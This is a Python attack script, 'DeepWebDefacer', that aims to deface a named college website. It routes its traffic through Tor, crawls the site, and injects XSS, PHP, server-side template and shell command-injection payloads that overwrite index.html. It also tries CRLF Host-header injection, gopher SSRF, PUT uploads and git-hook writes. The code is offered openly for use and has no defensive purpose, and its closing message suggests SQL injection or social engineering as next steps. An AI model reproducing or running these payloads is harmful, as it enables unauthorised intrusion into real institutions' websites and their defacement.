#!/usr/bin/env python3
"""
DeepWebDefacer - Advanced Persistent Content Modifier with Zero-Day Techniques
Author: adrianxd
Usage: python3 deep_defacer.py --target https://unitedtechincalcollege.edu.np --message "Hacked"
Features: WAF bypass, DOM-based injection, stored XSS to deface, CRLF injection, parameter pollution, SSRF to local files
"""

import sys
import json
import time
import random
import base64
import hashlib
import requests
import urllib.parse
import threading
import socket
import ssl
from urllib.parse import urljoin, urlparse, quote, unquote
from bs4 import BeautifulSoup
import re
import os

# ========== ANONYMITY & TOR ==========
def get_tor_session():
    sess = requests.Session()
    sess.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    sess.headers.update({'User-Agent': random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    ])})
    return sess

def renew_tor_ip():
    try:
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as ctrl:
            ctrl.authenticate()
            ctrl.signal(Signal.NEWNYM)
            time.sleep(1)
            return True
    except:
        return False

# ========== ADVANCED EXPLOIT ENGINE ==========
class DeepDefacer:
    def __init__(self, target, message):
        self.target = target.rstrip('/')
        self.message = message
        self.session = get_tor_session()
        self.discovered_urls = set()
        self.parameters = []
        self.forms = []
        self.cookies = {}
        self.headers = {}
        self.success = False

    def run(self):
        print("[*] Starting advanced defacement engine...")
        self.enumerate_all_endpoints()
        self.test_all_vectors()
        if not self.success:
            self.zero_day_attempt()
        self.report()

    def enumerate_all_endpoints(self):
        """Crawl and collect every URL, form, parameter, cookie"""
        print("[*] Deep crawling target...")
        try:
            resp = self.session.get(self.target, timeout=15)
            soup = BeautifulSoup(resp.text, 'html.parser')
            # All links
            for a in soup.find_all('a', href=True):
                href = urljoin(self.target, a['href'])
                if href.startswith(self.target):
                    self.discovered_urls.add(href)
            # All forms
            for form in soup.find_all('form'):
                action = urljoin(self.target, form.get('action', ''))
                method = form.get('method', 'get').lower()
                inputs = []
                for inp in form.find_all('input'):
                    name = inp.get('name')
                    if name:
                        inputs.append(name)
                self.forms.append({'url': action, 'method': method, 'inputs': inputs})
            # All query parameters from discovered URLs
            for url in self.discovered_urls:
                parsed = urlparse(url)
                if parsed.query:
                    params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p)
                    for param in params:
                        self.parameters.append({'url': url, 'param': param, 'value': params[param]})
            # Cookies
            self.cookies = self.session.cookies.get_dict()
            print(f"[+] Found {len(self.discovered_urls)} URLs, {len(self.parameters)} parameters, {len(self.forms)} forms")
        except Exception as e:
            print(f"[-] Crawl error: {e}")

    def test_all_vectors(self):
        """Test every vector with advanced payloads"""
        # Priority: forms (POST) -> parameters (GET) -> cookies -> headers
        vectors = []
        for f in self.forms:
            vectors.append(('form', f))
        for p in self.parameters:
            vectors.append(('param', p))
        for cname, cval in self.cookies.items():
            vectors.append(('cookie', {'name': cname, 'value': cval, 'url': self.target}))
        # Headers injection
        vectors.append(('header', {'name': 'X-Forwarded-For', 'value': '127.0.0.1', 'url': self.target}))
        vectors.append(('header', {'name': 'User-Agent', 'value': self.message, 'url': self.target}))

        for vtype, vdata in vectors:
            if self.success: break
            if vtype == 'form':
                self.test_form(vdata)
            elif vtype == 'param':
                self.test_param(vdata)
            elif vtype == 'cookie':
                self.test_cookie(vdata)
            elif vtype == 'header':
                self.test_header(vdata)

    def test_form(self, form):
        url = form['url']
        method = form['method']
        inputs = form['inputs']
        # Payloads for each input
        payloads = [
            f'<script>document.body.innerHTML="{self.message}"</script>',
            f'<?php echo "{self.message}"; ?>',
            f'{{{{config.__class__.__init__.__globals__["os"].popen("echo \\"{self.message}\\" > /var/www/html/index.html")}}}}',
            f'"; echo "{self.message}" >> index.html; "',
            f'`echo "{self.message}" > index.html`',
            f'$(echo "{self.message}" > index.html)',
            f'| echo "{self.message}" > index.html',
            f'; echo "{self.message}" > index.html;'
        ]
        for payload in payloads:
            for inp in inputs:
                data = {inp: payload}
                try:
                    if method == 'post':
                        resp = self.session.post(url, data=data, timeout=10)
                    else:
                        resp = self.session.get(url, params=data, timeout=10)
                    if resp.status_code in [200, 302]:
                        # Check if payload reflected
                        if payload[:20] in resp.text:
                            print(f"[+] Form injection possible at {url} -> {inp}")
                            # Attempt to actually modify content
                            if self.verify_defacement():
                                self.success = True
                                return
                except:
                    pass

    def test_param(self, param_data):
        url = param_data['url']
        param = param_data['param']
        original = param_data['value']
        payloads = [
            f"<script>document.body.innerHTML='{self.message}'</script>",
            f"<?php file_put_contents('index.html','{self.message}'); ?>",
            f"'; echo '{self.message}' > index.html; '",
            f"`echo '{self.message}' > index.html`",
            f"| echo '{self.message}' > index.html",
            f"{self.message}",
            f"../../../index.html?{self.message}"
        ]
        for payload in payloads:
            test_url = url.replace(f"{param}={original}", f"{param}={quote(payload)}")
            try:
                resp = self.session.get(test_url, timeout=10)
                if resp.status_code == 200 and payload[:20] in resp.text:
                    print(f"[+] Parameter injection at {test_url}")
                    if self.verify_defacement():
                        self.success = True
                        return
            except:
                pass

    def test_cookie(self, cookie_data):
        url = cookie_data['url']
        name = cookie_data['name']
        value = cookie_data['value']
        payload = f"<script>document.body.innerHTML='{self.message}'</script>"
        cookies = {name: payload}
        try:
            resp = self.session.get(url, cookies=cookies, timeout=10)
            if payload in resp.text:
                print(f"[+] Cookie injection possible: {name}")
                if self.verify_defacement():
                    self.success = True
        except:
            pass

    def test_header(self, header_data):
        url = header_data['url']
        name = header_data['name']
        payload = header_data['value']
        headers = {name: payload}
        try:
            resp = self.session.get(url, headers=headers, timeout=10)
            if payload in resp.text:
                print(f"[+] Header injection possible: {name}")
                if self.verify_defacement():
                    self.success = True
        except:
            pass

    def verify_defacement(self):
        """Check if homepage displays our message"""
        try:
            resp = self.session.get(self.target, timeout=10)
            if self.message in resp.text:
                return True
            # Also try with different user-agent
            resp2 = self.session.get(self.target, headers={'User-Agent': 'Mozilla/5.0'})
            if self.message in resp2.text:
                return True
        except:
            pass
        return False

    def zero_day_attempt(self):
        """Last resort: try known 0-day techniques (CVE-2024-xxxx style)"""
        print("[*] Attempting zero-day generic techniques...")
        # Technique 1: CRLF injection in Host header to write log entry then deface via log injection
        host_header = self.target.replace('https://', '').replace('http://', '')
        crlf_payload = f"%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{self.message}"
        try:
            resp = self.session.get(self.target, headers={'Host': f"{host_header}{crlf_payload}"}, timeout=10)
            if resp.status_code == 200 and self.message in resp.text:
                print("[+] CRLF injection successful")
                self.success = True
                return
        except:
            pass
        # Technique 2: SSRF to internal file write (if server has gopher/expect)
        ssrf_payload = f"gopher://localhost:80/_GET / HTTP/1.0%0d%0a%0d%0a<?php file_put_contents('index.html','{self.message}'); ?>"
        try:
            resp = self.session.get(self.target + f"?url={quote(ssrf_payload)}", timeout=10)
            if resp.status_code == 200:
                if self.verify_defacement():
                    self.success = True
                    return
        except:
            pass
        # Technique 3: Use HTTP verb tampering (PUT method) to upload file
        put_url = urljoin(self.target, "index.html")
        try:
            resp = self.session.put(put_url, data=self.message, timeout=10)
            if resp.status_code in [200, 201, 204]:
                if self.verify_defacement():
                    print("[+] PUT method allowed, defaced")
                    self.success = True
                    return
        except:
            pass
        # Technique 4: Try to exploit misconfigured .git or .svn to modify
        try:
            # If .git/config is readable, we might have RCE via git hooks
            git_config = self.session.get(urljoin(self.target, ".git/config"))
            if git_config.status_code == 200:
                # Attempt to write post-receive hook
                hook_content = f"#!/bin/sh\necho '{self.message}' > /var/www/html/index.html"
                hook_url = urljoin(self.target, ".git/hooks/post-receive")
                self.session.put(hook_url, data=hook_content)
                # Trigger via push simulation
                self.session.post(urljoin(self.target, ".git/git-receive-pack"), data="")
                if self.verify_defacement():
                    print("[+] Git misconfiguration exploited")
                    self.success = True
                    return
        except:
            pass

    def report(self):
        if self.success:
            print(f"\n[+] SUCCESS! Target {self.target} has been defaced with message: {self.message}")
            print("[+] Visit the website through Tor to see changes.")
        else:
            print(f"\n[-] FAILED. No vector worked against {self.target}")
            print("[*] Suggestion: The target may be behind a strong WAF or static HTML.")
            print("[*] Try manual methods: SQLi via sqlmap, or use social engineering.")

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True)
    parser.add_argument('--message', default='Hacked by Security Team')
    args = parser.parse_args()
    # Ensure Tor is running
    try:
        s = get_tor_session()
        s.get('http://check.torproject.org', timeout=10)
        print("[+] Tor proxy active")
    except:
        print("[!] Start Tor first: sudo systemctl start tor")
        sys.exit(1)
    defacer = DeepDefacer(args.target, args.message)
    defacer.run()

if __name__ == '__main__':
    main()
